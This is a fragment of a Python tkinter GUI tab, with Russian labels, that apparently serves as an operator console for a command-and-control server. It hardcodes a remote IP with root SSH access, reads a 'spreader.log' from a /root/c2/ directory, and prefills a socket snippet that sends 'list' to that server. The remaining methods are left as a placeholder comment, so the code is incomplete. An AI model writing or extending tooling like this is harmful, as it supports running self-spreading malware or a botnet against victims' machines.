import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import threading, paramiko, socket, json, time, os, sys, io, ast

class DiagnosticTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.vps_host = "80.249.146.202"
        self.vps_user = "root"
        self.vps_pass = None
        self.create_widgets()

    def create_widgets(self):
        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="Диагностика VPS", command=self.run_diag).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Автоисправление VPS", command=self.run_repair).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Проверить порт 80", command=self.check_port).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Анализ кода", command=self.run_code_analysis).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Создать вкладку", command=self.create_tab_wizard).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Лог спредера", command=self.show_spreader_log).pack(side=tk.LEFT, padx=2)

        self.log = scrolledtext.ScrolledText(self, height=10, bg='white', font=('Consolas', 9))
        self.log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        console_frame = ttk.LabelFrame(self, text="Python-консоль (быстрые проверки)")
        console_frame.pack(fill=tk.X, padx=5, pady=5)
        self.code_entry = tk.Text(console_frame, height=4, bg='#ffffcc', font=('Consolas', 10))
        self.code_entry.pack(fill=tk.X, padx=5, pady=2)
        self.code_entry.insert(tk.END, "s = socket.socket(); s.settimeout(3); s.connect(('80.249.146.202',80)); s.sendall(b'list'); print(s.recv(4096).decode())")
        ttk.Button(console_frame, text="Выполнить код", command=self.exec_python).pack(pady=2)

    # ------------------- Показ лога спредера -------------------
    def show_spreader_log(self):
        if not self._ensure_pass(): return
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Получение лога спредера...\n")
        def task():
            out, _ = self._ssh_exec("cat /root/c2/spreader.log 2>/dev/null | tail -30")
            self.log.insert(tk.END, "--- Последние 30 строк spreader.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    # ------------------- Остальные методы (диагностика, автоисправление, консоль, анализ, генератор) полностью скопированы из предыдущей версии v25.18.1
    # ... (вставьте сюда все остальные методы из предыдущего полного diagnostic_tab.py)
